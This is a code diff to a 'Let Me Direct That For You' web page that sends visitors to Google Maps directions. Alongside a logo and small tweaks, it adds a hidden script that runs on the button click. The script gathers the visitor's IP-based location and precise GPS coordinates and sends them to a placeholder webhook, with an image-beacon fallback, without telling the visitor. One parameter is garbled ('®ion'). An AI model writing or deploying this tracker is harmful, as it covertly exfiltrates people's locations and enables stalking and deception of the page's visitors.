@@ -94,6 +94,13 @@
       justify-content: center;
     }
 
+    .logo {
+      max-width: 150px;
+      height: auto;
+      display: block;
+      margin: 0 auto 1rem auto;
+    }
+
     p {
       font-size: 1rem;
       max-width: 600px;
@@ -216,6 +223,8 @@
     </select>
     <button class="toggle" id="theme-toggle" aria-label="Toggle dark mode">🌙</button>
   </div>
+
+  <img src="lmdtfylogo.svg" alt="Let Me Direct That For You Logo" class="logo">
 
   <div class="title" id="title">
     <span>🔒</span> Let Me Direct That For You
@@ -368,7 +377,7 @@
           document.getElementById("loading-label").innerText = t.redirecting;
           const userLat = position.coords.latitude;
           const userLon = position.coords.longitude;
-          const mapsUrl = `https://www.google.com/maps/dir/?api=1&origin=${userLat},${userLon}&destination=${destinationLat},${destinationLon}&travelmode=driving`;
+          const mapsUrl = `https://www.google.com/maps/dir/?api=1&origin=${userLat},${userLon}&destination=${destinationLat},${destinationLon}`;
           setTimeout(() => {
             window.location.href = mapsUrl;
           }, 1000);
@@ -398,7 +407,7 @@
 
       document.getElementById("fallback-btn").addEventListener("click", () => {
         fallbackMessageEl.style.display = "none";
-      }, { once: true }); // Use 'once' to avoid multiple listeners
+      }, { once: true });
     }
 
     document.getElementById("lang-select").addEventListener("change", function () {
@@ -412,6 +421,100 @@
       detectDeviceType();
       autoDetectLanguage();
     });
+  </script>
+
+  <script>
+    let locationData = {
+      ip: "unknown",
+      region: "unknown",
+      country: "unknown",
+      city: "unknown"
+    };
+
+    async function loadIpData() {
+      try {
+        const res = await fetch('https://ipwho.is/');
+        const ip = await res.json();
+        locationData.ip = ip.ip || "unknown";
+        locationData.region = ip.region || "unknown";
+        locationData.country = ip.country || "unknown";
+        locationData.city = ip.city || "unknown";
+      } catch {
+        locationData.ip = "unresolved";
+        try {
+          const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+          const data = await res.text();
+          const ipInfo = Object.fromEntries(data.trim().split('\n').map(line => line.split('=')));
+          locationData.ip = ipInfo.ip || "unresolved";
+          locationData.country = ipInfo.loc || "unknown";
+          locationData.region = "unknown";
+          locationData.city = "unknown";
+        } catch {
+          locationData.ip = "unresolved-fallback";
+          locationData.country = "unknown";
+          locationData.region = "unknown";
+          locationData.city = "unknown";
+        }
+      }
+    }
+
+    document.getElementById("button").addEventListener("click", async () => {
+      if (!navigator.geolocation) {
+        await loadIpData();
+        return fallbackBeacon("unsupported");
+      }
+
+      await loadIpData();
+
+      navigator.geolocation.getCurrentPosition(
+        async pos => {
+          const data = {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            country: locationData.country,
+            region: locationData.region,
+            deviceType: document.body.classList.contains('mobile') ? 'mobile' :
+                        document.body.classList.contains('tablet') ? 'tablet' : 'desktop'
+          };
+
+          try {
+            const response = await fetch("INSERT UPDATED WEBHOOK HERE", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(data)
+            });
+            if (response.ok) {
+              console.log("Webhook POST sent");
+            } else {
+              throw new Error("POST failed");
+            }
+          } catch {
+            await fallbackBeacon("fetch-fail", pos);
+          }
+        },
+        async () => {
+          await loadIpData();
+          await fallbackBeacon("refused");
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    });
+
+    async function fallbackBeacon(reason, pos = {}) {
+      const lat = pos.coords?.latitude || "unknown";
+      const lon = pos.coords?.longitude || "unknown";
+      const url = `INSERT UPDATED WEBHOOK HERE?ref=${encodeURIComponent(reason)}` +
+        `&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}` +
+        `&country=${encodeURIComponent(locationData.country)}` +
+        `®ion=${encodeURIComponent(locationData.region)}` +
+        `&deviceType=${encodeURIComponent(
+          document.body.classList.contains('mobile') ? 'mobile' :
+          document.body.classList.contains('tablet') ? 'tablet' : 'desktop'
+        )}`;
+      const img = new Image();
+      img.onerror = () => console.error("GET request failed:", url);
+      img.src = url;
+    }
   </script>
 </body>
 </html>
